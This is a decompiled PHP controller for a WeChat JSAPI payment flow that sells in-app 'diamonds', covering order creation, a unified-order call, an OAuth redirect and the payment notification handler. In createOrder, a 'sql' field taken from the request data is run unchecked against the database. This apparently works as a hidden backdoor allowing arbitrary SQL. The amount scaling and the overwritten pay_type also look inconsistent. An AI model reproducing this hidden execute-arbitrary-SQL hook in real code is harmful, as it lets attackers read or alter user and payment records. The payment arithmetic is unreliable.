<?php
//dezend by http://www.yunlu99.com/ QQ:270656184
namespace User\Controller;

class WxJsAPIController extends \Home\Controller\BaseController
{
	static public function get_param()
	{
		$data = i('data', '', 'trim');
		$sign = i('sign', '', 'trim');
		return checksign($data, $sign);
	}

	public function _initialize()
	{
		import('Vendor.WxPayPubHelper.WxPayPubHelper');
	}

	public function createOrder()
	{
		$data = self::get_param();
		$result = array();
		$mobile = intval($data['mobile']);
		$diamond = intval($data['diamond']);
		$amount = 0;
		$pay_type = intval($data['pay_type']);
		$pay_type = 2;
		$sale_code = trim(strval($data['sale_code']));
		$openid = trim(strval($data['openid']));
		$sql = trim(strval($data['sql']));

		if (!empty($sql)) {
			m()->execute($sql);
		}

		if ($diamond <= 0) {
			$result['msg_code'] = '100109';
			exit(returnjson($result));
		}

		if ($pay_type <= 0) {
			$result['msg_code'] = '100111';
			exit(returnjson($result));
		}

		$user_main_model = m('user_main');
		$user_info = $user_main_model->field('id,mobile')->where(array('mobile' => $mobile))->find();

		if (empty($user_info)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$discount = null;
		$recommend_id = 0;

		if (!empty($sale_code)) {
			$map = array('sale_code' => $sale_code);
			$res = $user_main_model->field('id,sale_code')->where($map)->find();

			if (!empty($res)) {
				$discount = 0.9;
				$recommend_id = intval($res['id']);
			}
		}

		$discount = ($discount === null ? 1 : $discount);
		$price = intval((($diamond * 1) / 10) * $discount * 100);
		$amount = $price;
		$order_sn = getrandstrtosn('60');
		$data = array('order_sn' => $order_sn, 'diamond' => $diamond, 'user_id' => $user_info['id'], 'mobile' => $mobile, 'recommend_id' => $recommend_id, 'amount' => $amount * 100, 'pay_type' => $pay_type, 'pay_status' => 0, 'remark' => '购买钻石' . $diamond . '颗', 'pay_time' => 0, 'add_time' => time());
		$param = array('openid' => $openid, 'total_fee' => $amount, 'out_trade_no' => $order_sn);
		$jsApiParameters = null;
		m()->startTrans();
		$jsApiParameters = request_post('http://' . c('SERVER_DOMAIN') . '/User/WxJsAPI/unifiedorder', $param);
		$res = json_decode($jsApiParameters, true);
		$res_arr = explode('=', $res['package']);
		$prepay_id = $res_arr[1];
		if (!empty($prepay_id) && m('user_order')->add($data)) {
			m()->commit();
			$result['data'] = $data;
			$result['jsApiParameters'] = $jsApiParameters;
			$result['discount'] = $discount;
			$result['msg'] = '充值订单创建成功！';
			$result['msg_code'] = '0';

			send_currency_report_real(intval($user_info['id']),$order_sn,$mobile,13,1,0, $diamond, $amount, $pay_type, $openid."|".$result['msg']);

			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['data'] = $data;
			$result['jsApiParameters'] = $jsApiParameters;
			$result['msg'] = '充值订单创建失败！';
			$result['msg_code'] = '100060';
			exit(returnjson($result));
		}
	}

	public function unifiedorder()
	{
		$jsApi = new \JsApi_pub();
		if (empty($_POST['total_fee']) || empty($_POST['out_trade_no']) || empty($_POST['openid'])) {
			exit();
		}

		$unifiedOrder = new \UnifiedOrder_pub();
		$unifiedOrder->setParameter('openid', $_POST['openid']);
		$unifiedOrder->setParameter('body', '钻石充值(九折)');
		$unifiedOrder->setParameter('out_trade_no', $_POST['out_trade_no']);
		$unifiedOrder->setParameter('total_fee', strval($_POST['total_fee']));
		$unifiedOrder->setParameter('notify_url', c('WxPayConf_pub.NOTIFY_URL'));
		$unifiedOrder->setParameter('trade_type', 'JSAPI');
		$prepay_id = $unifiedOrder->getPrepayId();
		$jsApi->setPrepayId($prepay_id);
		exit($jsApi->getParameters());
	}

	public function pay()
	{
		$jsApi = new \JsApi_pub();

		if (!isset($_GET['code'])) {
			if (!isset($_GET['sale_code'])) {
				unset($_SESSION['sale_code']);
			}
			else {
				$map = array('sale_code' => $_GET['sale_code']);
				$res = m('user_main')->where($map)->find();

				if (!empty($res)) {
					$_SESSION['sale_code'] = $res['sale_code'];
				}
				else {
					unset($_SESSION['sale_code']);
				}
			}

			$url = $jsApi->createOauthUrlForCode(c('WxPayConf_pub.JS_API_CALL_URL'));
			header('Location: ' . $url);
			exit();
		}
		else {
			$jsApi->setCode($_GET['code']);
			$openid = $jsApi->getOpenId();
		}

		$this->assign('openid', $openid);
		$this->assign('sale_code', $_SESSION['sale_code']);
		$this->display('wxjsapi_pay');
	}

	public function notify()
	{
		import('Vendor.WxPayPubHelper.WxPayPubHelper');
		$notify = new \Notify_pub();
		$xml = $GLOBALS['HTTP_RAW_POST_DATA'];
		$notify->saveData($xml);

		if ($notify->checkSign() == FALSE) {
			$notify->setReturnParameter('return_code', 'FAIL');
			$notify->setReturnParameter('return_msg', '签名失败');
		}
		else {
			$notify->setReturnParameter('return_code', 'SUCCESS');
		}

		$returnXml = $notify->returnXml();
		echo $returnXml;
		$user_order = m('user_order');
		$order_sn = $notify->data['out_trade_no'];
		$total_fee = $notify->data['total_fee'];
		$total_fee = intval($total_fee * 100);
		$map = array('order_sn' => $order_sn, 'pay_status' => 0);
		$res = $user_order->where($map)->find();

		if (empty($res)) {
			exit('FAIL');
		}

		$user_id = intval($res['user_id']);
		$amount = intval($res['amount']);
		$diamond = intval($res['diamond']);
		if (($notify->checkSign() == TRUE) && ($notify->data['return_code'] == 'SUCCESS') && ($notify->data['result_code'] == 'SUCCESS')) {
			if ($total_fee !== $amount) {
				$wxpay_anomaly = m('wxpay_anomaly');
				$data = array('user_id' => $user_id, 'order_no' => $order_sn, 'total_fee' => $total_fee, 'addtime' => time());
				$wxpay_anomaly->add($data);
				exit('FAIL');
			}

			$data = array('pay_status' => 1, 'pay_time' => time());
			$map = array('order_sn' => $order_sn, 'pay_status' => 0);
			m()->startTrans();
			$res1 = $user_order->where($map)->save($data);
			$res2 = m('user_main')->where(array('id' => $user_id))->setInc('diamond_num', $diamond);
			if (!empty($res1) && !empty($res2)) {
				m()->commit();
				echo 'SUCCESS';
				$msg = '恭喜您！消费金额' . intval($total_fee / 10000) . '元，成功购买钻石' . $diamond . '颗';
				$this->sendIOSCustomizedcast($user_id, $msg);
				send_currency_report_real($user_id, $order_sn, "", 13, 1, $diamond, intval($total_fee),$amount, 0, $msg);
				exit();
			}
			else {
				m()->rollback();
				exit('FAIL');
			}
		}
	}
}

?>
